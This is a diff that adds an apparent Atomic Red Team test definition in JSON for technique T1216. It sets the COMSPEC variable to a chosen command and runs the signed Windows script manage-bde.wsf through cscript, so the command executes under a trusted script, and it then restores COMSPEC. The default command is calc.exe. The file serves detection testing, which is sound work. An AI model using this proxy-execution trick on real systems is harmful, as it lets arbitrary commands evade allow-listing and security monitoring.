@@ -1,0 +1,52 @@
+{
+  "id": "2a8f2d3c-3dec-4262-99dd-150cb2a4d63a",
+  "name": "manage-bde.wsf Signed Script Command Execution",
+  "description": "Executes the signed manage-bde.wsf script with options to execute an arbitrary command.\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "0b51dd42-905a-4a76-956d-cc2d751c67c0",
+      "type": "execute-command",
+      "data": {
+        "command": "set comspec=#{command_to_execute}\ncscript %windir%\\System32\\manage-bde.wsf\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "ff337545-b685-4b45-a2e5-c40758be7c03",
+      "type": "execute-command",
+      "data": {
+        "command": "set comspec=%windir%\\System32\\cmd.exe\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "0b51dd42-905a-4a76-956d-cc2d751c67c0",
+      "p": "on-success",
+      "o": "ff337545-b685-4b45-a2e5-c40758be7c03"
+    },
+    {
+      "s": "0b51dd42-905a-4a76-956d-cc2d751c67c0",
+      "p": "on-failure",
+      "o": "ff337545-b685-4b45-a2e5-c40758be7c03"
+    }
+  ],
+  "tags": [
+    "T1216",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "command_to_execute",
+      "type": "path",
+      "description": "A command to execute.",
+      "value": "%windir%\\System32\\calc.exe"
+    }
+  ]
+}
